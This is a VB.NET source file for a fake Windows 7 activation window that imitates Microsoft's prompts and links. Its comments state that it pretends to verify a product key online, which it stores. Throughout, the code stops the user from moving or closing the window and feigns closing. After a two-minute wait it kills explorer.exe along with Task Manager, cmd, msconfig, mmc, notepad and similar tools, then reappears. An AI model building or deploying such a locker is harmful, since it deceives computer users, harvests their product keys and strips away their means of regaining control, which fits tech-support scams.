Public Class Form2
    Protected Overrides Sub WndProc(ByRef m As Message)
        Const WM_SYSCOMMAND As Integer = &H112
        Const SC_MOVE As Integer = &HF010

        Select Case m.Msg
            Case WM_SYSCOMMAND
                Dim command As Integer = m.WParam.ToInt32() And &HFFF0
                If command = SC_MOVE Then
                    Return
                End If
        End Select

        MyBase.WndProc(m)
    End Sub

    Private Sub productKeyHelpLinkLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles productKeyHelpLinkLabel.LinkClicked
        Dim KeyHelpAddress As String = "https://support.microsoft.com/en-us/help/10749/windows-10-find-product-key"
        Process.Start(KeyHelpAddress)
    End Sub

    Private Sub helpActivationLinkLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles helpActivationLinkLabel.LinkClicked
        Dim ActivationAddress As String = "https://support.microsoft.com/en-us/help/15083/windows-how-to-activate"
        Process.Start(ActivationAddress)
    End Sub

    Private Sub privacyLinkLabel_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles privacyLinkLabel.LinkClicked
        Dim PrivacyAddress As String = "https://privacy.microsoft.com/en-us/privacystatement"
        Process.Start(PrivacyAddress)
    End Sub

    Private Sub nextBtn_Click(sender As Object, e As EventArgs) Handles nextBtn.Click
        If productKeyTextBox.TextLength < 29 And productKeyTextBox.Text IsNot "" Then
            MessageBox.Show("The Windows 7 product key you typed was incorrect. Check your product key, and type it again.",
            "Invalid product key",
            MessageBoxButtons.OK,
            MessageBoxIcon.Warning,
            MessageBoxDefaultButton.Button1)
        ElseIf productKeyTextBox.Text = "" Then
            MessageBox.Show("You must enter a valid product key before activating online. Check your product key, and type it again.",
            "Windows Activation",
            MessageBoxButtons.OK,
            MessageBoxIcon.Warning,
            MessageBoxDefaultButton.Button1)
        Else
            'Store the typed product key
            productKey = productKeyTextBox.Text.ToString()
            'Open the form that will pretend to check the Product Key online
            Me.Hide()
            Verification.Show()
        End If
    End Sub

    Private Sub cancelBtn_Click(sender As Object, e As EventArgs) Handles cancelBtn.Click
        'Restart explorer and pretend the application is closed
        Dim ExecProcess = New Process()
        ExecProcess.StartInfo.UseShellExecute = True
        ExecProcess.StartInfo.CreateNoWindow = True
        ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
        ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
        ExecProcess.Start()

        Me.productKeyTextBox.Clear()
        'Hide the application...
        Me.Hide()
        '...for 2 minutes (120000ms)
        Threading.Thread.Sleep(120000)
        'Threading.Thread.Sleep(2000) 'Testing
        Shell("taskkill /F /IM explorer.exe")
        For Each p As Process In Process.GetProcesses()
            If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Or p.ProcessName = "iexplore" Then
                p.Kill()
            End If
        Next
        Form1.activateBtn.Select()
        Form1.Show()
    End Sub

    Private Sub Form2_Closing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
        'The user can't close the application
        If e.CloseReason = CloseReason.UserClosing Then
            e.Cancel = True

            'Restart explorer and pretend the application is closed
            Dim ExecProcess = New Process()
            ExecProcess.StartInfo.UseShellExecute = True
            ExecProcess.StartInfo.CreateNoWindow = True
            ExecProcess.StartInfo.FileName = "C:\Windows\explorer.exe"
            ExecProcess.StartInfo.WorkingDirectory = Application.StartupPath
            ExecProcess.Start()

            'Hide the application...
            Me.productKeyTextBox.Clear()
            Me.Hide()
            '...for 2 minutes (120000ms)
            Threading.Thread.Sleep(120000)
            'Threading.Thread.Sleep(2000) 'Testing
            Shell("taskkill /F /IM explorer.exe")
            For Each p As Process In Process.GetProcesses()
                If p.ProcessName = "iexplore" Or p.ProcessName = "msinfo32" Or p.ProcessName = "mmc" Or p.ProcessName = "dxdiag" Or p.ProcessName = "msconfig" Or p.ProcessName = "taskmgr" Or p.ProcessName = "cmd" Or p.ProcessName = "notepad" Or p.ProcessName = "syskey" Or p.ProcessName = "iexplore" Then
                    p.Kill()
                End If
            Next
            Form1.activateBtn.Select()
            Form1.Show()
        Else
            Application.Exit()
        End If
    End Sub
End Class